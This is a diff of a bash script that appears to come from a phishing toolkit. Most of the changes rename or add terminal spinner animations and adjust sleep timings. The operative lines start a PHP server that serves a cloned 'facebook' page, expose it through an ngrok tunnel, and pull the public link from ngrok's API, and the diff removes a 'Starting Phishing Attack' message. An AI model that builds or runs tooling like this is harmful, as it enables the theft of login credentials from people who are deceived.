@@ -72,14 +72,14 @@ else
 exit
 fi
 
-spin () {
+spin_shark () {
 local pid=$!
 local delay=0.05
 local spinstr='|/-\'
 while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 local temp=${spinstr#?}
 tput civis
-printf "\e[1;31m\r[\e[32m*\e[31m]\e[1;33m Fetching server ...  [\e[1;32m%c\e[1;33m]\e[0m  " "$spinstr"
+printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Setting up shark ...  [\e[1;92m%c\e[1;93m]\e[0m  " "$spinstr"
 local spinstr=$temp${spinstr%"$temp"}
 sleep $delay
 printf "\b\b\b\b\b\b"
@@ -88,6 +88,48 @@ printf "   \b\b\b"
 tput cnorm
 printf "\e[1;32m[Done]\e[0m"
 }
+
+spin () {
+local pid=$!
+local delay=0.05
+local spinstr='|/-\'
+while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
+local temp=${spinstr#?}
+tput civis
+printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Fetching server ...  [\e[1;92m%c\e[1;93m]\e[0m  " "$spinstr"
+local spinstr=$temp${spinstr%"$temp"}
+sleep $delay
+printf "\b\b\b\b\b\b"
+done
+printf "   \b\b\b"
+tput cnorm
+printf "\e[1;32m[Done]\e[0m"
+}
+
+spinner () {
+
+local pid=$!
+local delay=0.25
+local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )
+
+while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
+
+for i in "${spinner[@]}"
+do
+	tput civis
+	echo -ne "\033[34m\r[*] Executing Firewall ... \e[33m[\033[32m$i\033[33m]\033[0m   ";
+	sleep $delay
+	printf "\b\b\b\b\b\b\b\b";
+done
+done
+printf "   \b\b\b\b\b"
+tput cnorm
+printf "\e[1;33m [Done]\e[0m";
+echo "";
+
+}
+
+
 
 php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
 ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
@@ -178,15 +220,15 @@ ash() {
                             cd facebook/
                             echo 
 			    connection
-			    echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"   
+			    ( sleep 4 ) &> /dev/null & spin_shark
 			    php -S 127.0.0.1:4444 > /dev/null 2>&1 &    
 			    sleep 2  
 			    echo 
-			    (sleep 8) &> /dev/null & spin
+			    (sleep 6) &> /dev/null & spin
 			    echo
 			    tput civis
-			    ./ngrok http 4444 > /dev/null 2>&1 & 
-			    sleep 12
+			    ./ngrok http 4444 > /dev/null 2>&1 
+			    ( sleep 18 ) &> /dev/null & spinner
 			    echo 
 			    tput cnorm
 			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
